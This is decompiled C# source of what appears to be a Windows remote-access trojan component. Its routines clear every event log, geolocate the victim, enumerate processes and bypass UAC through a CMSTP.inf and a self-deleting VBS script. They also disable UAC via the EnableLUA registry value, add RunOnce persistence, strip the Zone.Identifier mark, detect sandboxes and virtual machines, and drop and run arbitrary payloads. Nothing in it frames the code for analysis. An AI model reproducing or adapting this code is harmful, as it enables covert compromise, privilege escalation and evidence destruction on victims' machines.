using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class Class45
{
	public static void smethod_0()
	{
		EventLog[] eventLogs = EventLog.GetEventLogs();
		foreach (EventLog val in eventLogs)
		{
			try
			{
				val.Clear();
				((Component)(object)val).Dispose();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_1()
	{
		object obj = null;
		try
		{
			string text = "https://whatismyipaddress.com/update-location";
			obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
			NewLateBinding.LateSet(obj, (Type)null, "Width", new object[1] { 250 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Height", new object[1] { 135 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Top", new object[1] { 0 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Left", new object[1] { 0 }, (string[])null, (Type[])null);
			object obj2 = obj;
			object[] array = new object[1] { text };
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			NewLateBinding.LateCall(obj2, (Type)null, "Navigate", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			while (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(obj, (Type)null, "ReadyState", new object[0], (string[])null, (Type[])null, (bool[])null), (object)4, false))
			{
				Application.DoEvents();
			}
			NewLateBinding.LateSet(obj, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Document", new object[0], (string[])null, (Type[])null, (bool[])null));
			Regex.Replace(Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "body", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "innerHTML", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[2]
			{
				new string[1] { "<td id=\"map1_lat\"></td>" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 1 }, (string[])null)), (Type)null, "Split", new object[2]
			{
				new string[1] { "<td></td>" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 0 }, (string[])null)).Replace("<td>", ""), "\\t|\\n|\\r", "").Replace("</td>", ",");
			Regex.Replace(Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "body", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "innerHTML", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[2]
			{
				new string[1] { "<td id=\"map1_lng\"></td>" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 1 }, (string[])null)), (Type)null, "Split", new object[2]
			{
				new string[1] { "<td></td>" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 0 }, (string[])null)).Replace("<td>", ""), "\\t|\\n|\\r", "").Replace("</td>", ",");
			NewLateBinding.LateCall(obj, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				NewLateBinding.LateCall(obj, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_2(string lat, string lng)
	{
		object obj = null;
		object result = null;
		try
		{
			string text = "http://geocoder.ca/?locate=" + lat + "+" + lng;
			obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
			NewLateBinding.LateSet(obj, (Type)null, "Width", new object[1] { 250 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Height", new object[1] { 135 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Top", new object[1] { 0 }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "Left", new object[1] { 0 }, (string[])null, (Type[])null);
			object obj2 = obj;
			object[] array = new object[1] { text };
			object[] array2 = array;
			bool[] array3 = new bool[1] { true };
			NewLateBinding.LateCall(obj2, (Type)null, "Navigate", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			while (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(obj, (Type)null, "ReadyState", new object[0], (string[])null, (Type[])null, (bool[])null), (object)4, false))
			{
				Application.DoEvents();
			}
			NewLateBinding.LateSet(obj, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
			string text2 = Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Document", new object[0], (string[])null, (Type[])null, (bool[])null)), (Type)null, "body", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "innerHTML", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[2]
			{
				new string[1] { "This is the nearest street address. [ <a href=\"https://geocoder.ca/?locate=" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 1 }, (string[])null)), (Type)null, "Split", new object[2]
			{
				new string[1] { "\">" },
				StringSplitOptions.None
			}, (string[])null, (Type[])null, (bool[])null), new object[1] { 0 }, (string[])null));
			NewLateBinding.LateCall(obj, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			result = text2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				NewLateBinding.LateCall(obj, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_3()
	{
		GClass63.smethod_1(Process.GetCurrentProcess().MainModule!.FileName);
	}

	public static object smethod_4()
	{
		List<object> list = new List<object>();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				string empty = string.Empty;
				empty = empty + process.ProcessName + ",";
				try
				{
					empty = empty + smethod_5(process) + ",";
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					try
					{
						empty += process.MainModule!.FileName;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						empty += " ,";
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
				empty += Conversions.ToString(process.Id);
				list.Add(empty);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		return list.ToArray();
	}

	public static string smethod_5(Process process, int buffer = 1024)
	{
		object obj = new StringBuilder(buffer);
		uint lpdwSize = (uint)((ulong)Conversions.ToUInteger(NewLateBinding.LateGet(obj, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)) + 1uL);
		if (Class9.QueryFullProcessImageName(process.Handle, 0u, (StringBuilder)obj, ref lpdwSize))
		{
			return obj.ToString();
		}
		return "No Path";
	}

	public static void smethod_6()
	{
		try
		{
			smethod_7(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7(string filename)
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
					if (!directoryInfo.Exists)
					{
						directoryInfo.Create();
					}
					FileInfo fileInfo = new FileInfo(Path.Combine(directoryInfo.FullName, "CMSTP.inf"));
					string value = "\r\n        [version]\r\n        Signature=$chicago$\r\n        AdvancedINF=2.5\r\n        [DefaultInstall]\r\n        CustomDestination=CustInstDestSectionAllUsers\r\n        RunPreSetupCommands=RunPreSetupCommandsSection\r\n        [RunPreSetupCommandsSection]\r\n        powershell.exe \"Start-Process '" + filename + "' -Verb RunAs\"\r\n        taskkill /IM cmstp.exe /F\r\n        [CustInstDestSectionAllUsers]\r\n        49000,49001=AllUSer_LDIDSection, 7\r\n        [AllUSer_LDIDSection]\r\n        \"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n        [Strings]\r\n        ServiceName=\"CMMGR32\"\r\n        ShortSvcName=\"CMMGR32\"";
					using (FileStream fileStream = fileInfo.Create())
					{
						using BinaryWriter binaryWriter = new BinaryWriter(fileStream, Encoding.ASCII);
						binaryWriter.Write(value);
						fileStream.Flush();
					}
					string value2 = "on error resume next\r\nCreateObject(\"Wscript.Shell\").Run \"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe") + " /au " + fileInfo.FullName + "\"\r\nCreateObject(\"Scripting.FileSystemObject\").DeleteFile WScript.ScriptFullName";
					StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Junction.vbs");
					streamWriter.Write(value2);
					streamWriter.Close();
					Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Junction.vbs");
					int num = 0;
					while (Process.GetProcessesByName("cmstp").Length == 0)
					{
						Class9.Sleep(100);
						num++;
						if (num > 15)
						{
							break;
						}
					}
					Class9.Sleep(500);
					SendKeys.SendWait("{ENTER}");
					SendKeys.SendWait("{ENTER}");
					SendKeys.SendWait("{ENTER}");
					GClass54.smethod_1();
					Process.GetCurrentProcess().Kill();
					smethod_19();
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			Console.WriteLine("Already admin");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_8(string name, string tpath)
	{
		if (!File.Exists(Interaction.Environ("localappdata") + "\\Execution.vbs"))
		{
			string value = "on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\" + name + "\", \"" + tpath + "\"\r\nset filesys = CreateObject(\"Scripting.FileSystemObject\")\r\nfilesys.CopyFile\"" + Process.GetCurrentProcess().MainModule!.FileName + "\", \"" + tpath + "\"\r\nHiddenStartfilesys.DeleteFile WScript.ScriptFullName";
			StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution.vbs");
			streamWriter.Write(value);
			streamWriter.Close();
		}
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution.vbs");
	}

	public static void smethod_9(string keypath, string value)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution3.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		}
		string value2 = "on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"" + keypath + "\", \"" + value + "\", \"REG_DWORD\"\r\nfilesys.DeleteFile WScript.ScriptFullName";
		StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		streamWriter.Write(value2);
		streamWriter.Close();
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution3.vbs");
	}

	public static void smethod_10(string keypath, string value)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution4.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution4.vbs");
		}
		string value2 = "on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"" + keypath + "\", \"" + value + "\"\r\nfilesys.DeleteFile WScript.ScriptFullName";
		StreamWriter streamWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution4.vbs");
		streamWriter.Write(value2);
		streamWriter.Close();
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution4.vbs");
	}

	public static object smethod_11()
	{
		return Class9.DeleteFile(Process.GetCurrentProcess().MainModule!.FileName + Convert.ToString(":Zone.Identifier"));
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	public static bool smethod_12()
	{
		bool result = false;
		try
		{
			if ((int)GetModuleHandle("SbieDll.dll") != 0)
			{
				result = true;
				return true;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool smethod_13()
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (File.Exists(Path.GetTempPath() + "ms.ini"))
			{
				return false;
			}
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					string text = Strings.StrConv(Convert.ToString(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Description"))), (VbStrConv)2, 0);
					if (!text.Contains("virtual"))
					{
						if (!text.Contains("vmware"))
						{
							if (!text.Contains("parallel"))
							{
								if (!text.Contains("vm additions"))
								{
									if (!text.Contains("remotefx"))
									{
										if (!text.Contains("generic"))
										{
											if (!text.Contains("cirrus logic"))
											{
												if (!text.Contains("standard vga"))
												{
													if (text.Contains("matrox"))
													{
														return true;
													}
													continue;
												}
												return true;
											}
											return true;
										}
										return true;
									}
									return true;
								}
								return true;
							}
							return true;
						}
						return true;
					}
					return true;
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return false;
		}
	}

	public static void smethod_14(string name)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(name);
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_15(FileInfo file)
	{
		bool result = false;
		try
		{
			file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None).Close();
			result = false;
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (ex2 is IOException && smethod_16(ex2) && Process.GetProcessesByName(Path.GetFileNameWithoutExtension(file.FullName)).Length != 0)
			{
				result = true;
				ProjectData.ClearProjectError();
				return true;
			}
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static bool smethod_16(Exception exception)
	{
		int num = Marshal.GetHRForException(exception) & 0xFFFF;
		if (num != 32 && num != 33)
		{
			return false;
		}
		return true;
	}

	public static bool smethod_17(string FileName, byte[] ByteArray, bool _000A_0014_002AOnce, bool Run)
	{
		bool result = false;
		try
		{
			if (!(File.Exists(FileName) && _000A_0014_002AOnce))
			{
				FileStream fileStream = new FileStream(FileName, FileMode.Create);
				int num = ByteArray.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					fileStream.WriteByte(ByteArray[i]);
				}
				fileStream.Close();
				if (Run)
				{
					Process.Start("explorer.exe", FileName);
					return result;
				}
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_18(string FileName, byte[] ByteArray)
	{
		if (File.Exists(FileName))
		{
			File.Delete(FileName);
		}
		FileStream fileStream = new FileStream(FileName, FileMode.Create);
		int num = ByteArray.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			fileStream.WriteByte(ByteArray[i]);
		}
		fileStream.Close();
	}

	public static void smethod_19()
	{
		smethod_9("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", "0");
	}
}
